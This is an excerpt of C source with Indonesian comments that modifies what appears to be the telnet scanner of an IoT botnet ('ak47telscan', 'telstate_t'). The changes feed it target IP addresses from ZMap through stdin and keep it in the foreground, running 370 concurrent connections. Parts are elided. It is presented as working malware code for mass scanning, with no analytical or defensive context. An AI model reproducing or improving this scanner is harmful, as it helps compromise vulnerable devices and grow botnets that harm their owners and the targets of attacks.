...
// ==================== MODIFIKASI 1: Fungsi baca dari ZMap ====================
in_addr_t getIPFromZmap() {
    char ip_str[16];
    if (fgets(ip_str, sizeof(ip_str), stdin) == NULL) {
        return INADDR_NONE; // EOF atau error
    }
    // Hapus newline
            ...
            case 0:
                {
                    if (fds[i].complete == 1) {
                        ...
                        memset(&(fds[i]), 0, sizeof(struct telstate_t));
                        fds[i].sockbuf = tmp;
                        // ========== MODIFIKASI 2: Ambil IP dari ZMap ==========
                        fds[i].ip = getIPFromZmap();
                        // Jika tidak ada input lagi, jangan reset state, tetap diam
                        if (fds[i].ip == INADDR_NONE) {
                            // Tidak ada IP lagi, tidur sebentar lalu coba lagi
                            // (biar program tidak busy loop)
                            usleep(100000);
                            continue;
                        }
                        // =====================================================
...
// ==================== MODIFIKASI 3: Main tanpa fork background ====================
int main(int argc, char **argv) {
    // Hapus fork agar proses utama tidak masuk background
    // dan stdin tetap terhubung.
    ...
    // Jalankan scanner dengan jumlah koneksi yang sesuai
    // Karena tidak ada fork, kita panggil langsung dengan jumlah socket maksimal.
    // Tapi perlu diingat: fungsi ak47telscan() memiliki loop tak terbatas dan akan
    // memproses IP dari stdin secara berurutan.
    ak47telscan(370, fds);
